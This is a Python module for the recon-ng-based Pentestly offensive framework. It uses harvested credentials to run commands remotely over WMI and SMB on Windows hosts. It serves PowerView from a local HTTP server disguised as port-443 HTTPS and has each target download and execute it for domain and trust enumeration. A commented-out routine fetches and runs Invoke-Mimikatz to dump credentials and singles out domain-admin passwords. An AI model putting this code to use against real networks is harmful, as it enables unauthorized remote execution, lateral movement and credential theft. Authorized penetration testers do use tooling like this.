from __future__ import print_function
from recon.core.module import BaseModule

import os
import subprocess

from libs.pentestlymodule import PentestlyModule
from libs.misc import parse_mimikatz, Colors

class Module(PentestlyModule):

    meta = {
        'name': 'Executes Powerview',
        'author': 'Cory Duplantis (@ctfhacker)',
        'description': 'Remotely downloads Invoke-Powerview.ps1 via SMB',
        'query': 'SELECT username,password,domain,host FROM pentestly_creds WHERE success="True" AND execute!="False"',
    }

    """
    def do_mimikatz():
        '''Execute Mimikatz via Powershell'''
        # command = get_powershell_command(url='https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1',
        results = execute_powershell(url='http://{}:443/Invoke-Mimikatz.ps1'.format(hosting_server),
                                    args = 'Invoke-Mimikatz -DumpCreds')
        for host,result in results:
            result = parse_mimikatz(result)
            for user, username, password, domain in result:
                if username in domain_admins:
                    success("[{}] DA creds found: {}\{}:{}".format(host, domain, username, password))
                    da_creds.append(Creds(username=username, password=password, domain=domain, host=host))
                else:
                    if '$' in username: # System account - useless
                        continue
                    success("[{}] Non-DA creds found: {}\{}:{}".format(host, domain, username, password))
                    non_da_creds.append(Creds(username=username, password=password, domain=domain, host=host))
    """

    def __init__(self, *args, **kwargs):
        result = BaseModule.__init__(self, *args, **kwargs)
        self.hosting_server = ''
        return result

    def select_local_interface(self):
        '''Display menu of local interfaces for selection'''
        proc = subprocess.Popen(['ip', 'addr'], stdout=subprocess.PIPE)
        result = proc.stdout.read().splitlines()
        ipv4_addrs = [line for line in result if 'inet ' in line]
        addrs = [addr.split()[1].split('/')[0] for addr in ipv4_addrs]
        choice = 99
        while 0 > choice or choice >= len(addrs):
            print("Select local interface for hosting scripts")
            print()

            for index, addr in enumerate(addrs):
                print("{}. {}".format(index, addr))

            choice = int(raw_input('> '))

        return addrs[choice]

    def module_pre(self):
        if not self.hosting_server:
            self.hosting_server = self.select_local_interface()

        self.curr_dir = os.getcwd()

        os.chdir(os.path.join(os.path.expanduser('~'), '.recon-ng', 'scripts'))
        # Act like using HTTPS, but really is HTTP
        self.proc = subprocess.Popen(['python2.7', '-m', 'SimpleHTTPServer', '443'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        self.test_execute()

    def module_run(self, creds):
        share = 'C$'
        url='http://{}:443/powerview.ps1'.format(self.hosting_server)
        args = 'Get-NetForestDomains; Get-NetDomainTrusts; Get-NetForestTrusts'
        command = self.powershell_download(url=url, args=args)

        domain_admins = self.query("select username from pentestly_creds where access like '%admin%'")
        domain_admins = [da[0] for da in domain_admins]
        print(domain_admins)

        # Reduce creds if options are given
        for username, password, domain, host in creds:
            if username == None:
                username = ''
            if password == None:
                password = ''
            self.smb.hosts[host] = {'user':username, 'passwd':password, 'domain':domain, 'port': 445}
            self.output("Execution creds: {}\{}:{}@{}".format(domain, username, password, host))
            self.output("Command: {}".format(command))
            try:
                result = self.wmi_execute(username, password, domain, host, command, get_results=False, get_powershell_results=True)
                print(result)

            except Exception as e:
                continue

    def module_post(self):
        os.chdir(self.curr_dir)
        self.proc.kill()
